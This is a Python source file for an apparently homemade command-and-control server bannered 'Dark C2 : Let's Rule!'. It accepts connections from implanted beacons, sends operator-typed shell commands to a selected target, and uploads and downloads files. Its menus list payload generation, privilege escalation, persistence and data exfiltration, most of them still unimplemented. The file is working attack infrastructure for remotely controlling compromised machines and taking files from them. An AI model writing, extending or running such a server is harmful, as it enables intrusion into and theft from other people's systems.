import socket
import threading
import pyfiglet
import os
import time
import select
import ssl

socket_list = []

# Function to handle the connection received
def listener_module():
    os.system("cls")
    header = "Socket List"
    print(f"{header:^40}")  # Centered header
    print("=" * 40)
    for i, soc in enumerate(socket_list):
        peer_name = soc.getpeername()
        print(f"Connection from  [{i+1}]: Peer Address = {peer_name}")
    print("Enter 0 To Exit To Main Menu")  
    print("=" * 40)     
    
 
    i=int(input("Select:"))
    if(i==0):
        os.system("cls")
        return
    print(socket_list[i-1].getpeername())
    response = manage_client(socket_list[i-1], socket_list[i-1].getpeername())
    if(response == "nuke"):
        return
    if(response == "exit"):
        listener_module()

####################################################################Beacon Menu#################################################

def beacon_command(client_socket, client_address):
    os.system("cls")
    print("Command Mode")
    while True:
        client_socket.send("Command Mode".encode())
        client_socket.send(input("$ ").encode())
        output = client_socket.recv(10240)
        print(output.decode())
        if(output.decode()=="exit"):
            os.system("cls")
            return
        if(output.decode()=="nuke"):
            client_socket.close()
            socket_list.remove(client_socket)
            os.system("cls")
            return
        time.sleep(1)  

def beacon_file_transfer(client_socket, client_address):
    os.system("cls")
    print("File Transfer Mode")
    client_socket.send("File Transfer Mode".encode())

    while True:
        
        command = input("$ ").strip()
        client_socket.send(command.encode())
        
        if command == "exit":
            os.system("cls")
            return
        elif command == "nuke":
            client_socket.close()
            socket_list.remove(client_socket)
            os.system("cls")
            return
        elif command.startswith("send"):
            # Sending file to client
            try:
                _, file_path = command.split(" ", 1)
                if os.path.exists(file_path):
                    # client_socket.send(f"send {os.path.basename(file_path)} ".encode())
                    ack = client_socket.recv(1024).decode()
                    if ack == "READY":
                        
                        with open(file_path, "rb") as file:
                            while chunk := file.read(1024):
                                client_socket.send(chunk)
                            client_socket.send("DONE".encode())
                            print(f"Uploaded :{file_path}")
                        print("")
                    else:
                        print("")
                else:
                    print(f"File '{file_path}' does not exist.")
            except Exception as e:
                print(f"Error: {e}")
        elif command.startswith("recv"):
            # Receiving file from client
            try:
                _, file_name = command.split(" ", 1)
                ack = client_socket.recv(1024).decode()
                if ack == "READY":
                    print("recv ready")
                    with open(file_name, "wb") as file:
                        while True:
                            chunk = client_socket.recv(1024)
                            if b"DONE" in chunk:
                                file.write(chunk.split(b"DONE")[0])
                                break
                            file.write(chunk)
                    print(f"File '{file_name}' received successfully.")
            except Exception as e:
                print(f"Error: {e}")
        else:
            output = client_socket.recv(10240)
            print(output.decode())
        
        time.sleep(1)



def privilege_up(client_socket, client_address):
    print("Priviledge Escalation")




####################################################################Beacon Menu End#################################################    

def manage_client(client_socket, client_address):
    os.system("cls")
    print(f"We have an incoming connection request accepted from {client_address}")
    
    try:
        # ASYNC receive message
        message = client_socket.recv(10240) if select.select([client_socket], [], [],1)[0] else "UNK".encode()

        print(f"Received from {client_address}: {message.decode('utf-8')}")
        response = beacon_menu()
        
        if (message.decode('utf-8') == "nuke" or response == "nuke"):
            client_socket.close()
            socket_list.remove(client_socket)
            print(f"Connection from {client_address} has been closed")
            res="nuke"
            return
        if message.decode('utf-8') == "exit" or response == "exit":
            res="exit"
            return
        
        if int(response) == 1:
            
            beacon_command(client_socket, client_address)

        if int(response) == 2:
            
            beacon_file_transfer(client_socket, client_address)    

        if int(response) == 3:
            privilege_up(client_socket, client_address)
        # client_socket.send(response.encode('utf-8'))
    except ConnectionResetError:
        print("Connection Error")
        return
    return "exit"    
    

# Server function to accept connections
def accept_connections(server):
    while True:
        client_socket, client_address = server.accept()
        socket_list.append(client_socket)


# Server setup
def start_server(host='127.0.0.1', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)  # Listen for up to 5 connections
    print(f"Server listening on {host}:{port}")

    # Start the thread to accept connections
    accept_thread = threading.Thread(target=accept_connections, args=(server,))
    accept_thread.daemon = True
    accept_thread.start()

    # Main thread handles the menu
    while True:
        ascii_banner = pyfiglet.figlet_format("Dark C2 : Let's Rule!")
        print(ascii_banner)
        choice = menu()
        if choice == '5':
            listener_module()
        elif choice == '8':
            break

def menu():
    print("Select an option:")
    print("1. Loader Generation")
    print("2. Payload/Beacon Generation")
    print("3. Configure C2 Server")
    print("4. Communication Channel Setup")
    print("5. List Connections")
    print("6. Data Exfiltration Setup")
    print("7. Persistence Mechanism Setup")
    print("8. Exit")
    choice = input("=> ")
    return choice

def beacon_menu():
    print("Select an option for the beacon:")
    print("1. Execute Commands on Target")
    print("2. File Transfer")
    print("3. Priviledge Escalation")
    print("4. Persistence Mechanism Setup")
    print("5. Data Exfiltration")
    print("6. Spawn New Processes")
    print("7. System Information Gathering")
    print("8. Network Scanning")
    print("9. Unload Beacon")
    print("10. Exit")
    choice = input("=> ")
    return choice




if __name__ == "__main__":
   
    start_server()















